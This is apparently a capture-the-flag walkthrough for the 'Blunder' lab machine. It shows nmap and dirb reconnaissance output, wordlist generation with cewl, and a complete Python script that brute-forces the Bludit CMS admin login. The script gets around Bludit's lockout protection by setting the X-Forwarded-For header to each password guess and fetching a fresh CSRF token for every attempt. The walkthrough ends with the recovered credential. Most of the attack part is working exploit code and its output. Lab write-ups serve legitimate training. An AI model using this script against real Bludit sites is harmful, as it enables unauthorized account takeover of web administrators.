# Walkthrough

* Check open ports with
  * `$ nmap -A -o nmap_escaneo.txt 10.10.10.191`

```
# Nmap 7.80 scan initiated Tue Oct 13 04:41:30 2020 as: nmap -A -o escaneo.txt 10.10.10.191
Nmap scan report for 10.10.10.191
Host is up (0.038s latency).
Not shown: 998 filtered ports
PORT   STATE  SERVICE VERSION
21/tcp closed ftp
80/tcp open   http    Apache httpd 2.4.41 ((Ubuntu))
|_http-generator: Blunder
|_http-server-header: Apache/2.4.41 (Ubuntu)
|_http-title: Blunder | A blunder of interesting facts

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
# Nmap done at Tue Oct 13 04:41:43 2020 -- 1 IP address (1 host up) scanned in 13.08 seconds
```

* Check existing directories with
  * `$ dirb http://10.10.10.191 -o dirb_fuzzed.txt`

```

-----------------
DIRB v2.22    
By The Dark Raver
-----------------

OUTPUT_FILE: fuzzed.txt
START_TIME: Tue Oct 13 06:02:30 2020
URL_BASE: http://10.10.10.191/
WORDLIST_FILES: /usr/share/dirb/wordlists/common.txt

-----------------

GENERATED WORDS: 4612

---- Scanning URL: http://10.10.10.191/ ----
+ http://10.10.10.191/0 (CODE:200|SIZE:8045)
+ http://10.10.10.191/about (CODE:200|SIZE:3281)
==> DIRECTORY: http://10.10.10.191/admin/
+ http://10.10.10.191/cgi-bin/ (CODE:301|SIZE:0)
+ http://10.10.10.191/empty (CODE:200|SIZE:3576)
+ http://10.10.10.191/LICENSE (CODE:200|SIZE:1083)
+ http://10.10.10.191/robots.txt (CODE:200|SIZE:22)
+ http://10.10.10.191/server-status (CODE:403|SIZE:277)
+ http://10.10.10.191/xyz (CODE:200|SIZE:3319)

---- Entering directory: http://10.10.10.191/admin/ ----
+ http://10.10.10.191/admin/ajax (CODE:401|SIZE:0)

-----------------
END_TIME: Tue Oct 13 06:17:57 2020
DOWNLOADED: 9224 - FOUND: 9
```

* Create our own wordlist for the fuzzer
  * `$ cewl 10.10.10.191 -w dict.txt`

* Download bruteforce tool for Blunder [here](https://rastating.github.io/bludit-brute-force-mitigation-bypass/)

* Change ip address, username and wordlist
```python3
#!/usr/bin/python3
import re
import requests

host = 'http://10.10.10.191'
login_url = host + '/admin/login'
username = 'fergus'
wordlist = []


file = open("wordlist.txt", "r").read().splitlines()

for password in file:
    session = requests.Session()
    login_page = session.get(login_url)
    csrf_token = re.search('input.+?name="tokenCSRF".+?value="(.+?)"', login_page.text).group(1)

    print('[*] Trying: {p}'.format(p = password))

    headers = {
        'X-Forwarded-For': password,
        'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/77.0.3865.90 Safari/537.36',
        'Referer': login_url
    }

    data = {
        'tokenCSRF': csrf_token,
        'username': username,
        'password': password,
        'save': ''
    }

    login_result = session.post(login_url, headers = headers, data = data, allow_redirects = False)

    if 'location' in login_result.headers:
        if '/admin/dashboard' in login_result.headers['location']:
            print()
            print('SUCCESS: Password found!')
            print('Use {u}:{p} to login.'.format(u = username, p = password))
            print()
            break
```

* Execute the script
  * `$ python3 fuzzer.py`

```
SUCCESS: Password found!
Use fergus:RolandDeschain to login.
```